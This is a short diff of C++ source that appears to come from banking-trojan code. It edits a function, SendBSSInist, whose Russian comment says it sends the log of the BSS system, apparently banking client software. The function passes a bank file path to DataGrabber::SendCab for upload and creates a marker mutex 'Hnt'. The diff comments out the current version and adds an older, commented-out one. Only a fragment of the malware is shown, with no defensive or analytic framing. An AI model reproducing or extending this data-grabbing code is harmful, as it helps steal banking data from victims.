@@ -1212,7 +1212,22 @@ bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
 
 
 
-DWORD WINAPI SendBSSInist( LPVOID lpData )
+//DWORD WINAPI SendBSSInist( LPVOID lpData )
+//{
+//	// Функция отправляет лог системы BSS
+//	#ifdef HunterH
+//		HANDLE tmp;
+//		tmp= (HANDLE)pCreateMutexA(NULL,FALSE,"Hnt");
+//	#endif
+//
+//	PBSSINIST Bank = (PBSSINIST)lpData;
+//
+//	DataGrabber::SendCab(Bank->FilePath, "BSS", NULL);
+//
+//	return 0;
+//}
+
+/* DWORD WINAPI SendBSSInist( LPVOID lpData )
 {
 	if (lpData == NULL)
 		return 0;
@@ -1383,7 +1398,7 @@ DWORD WINAPI SendBSSInist( LPVOID lpData )
 
 	return ret;
 }
-//#endif
+//#endif */
 
 
 
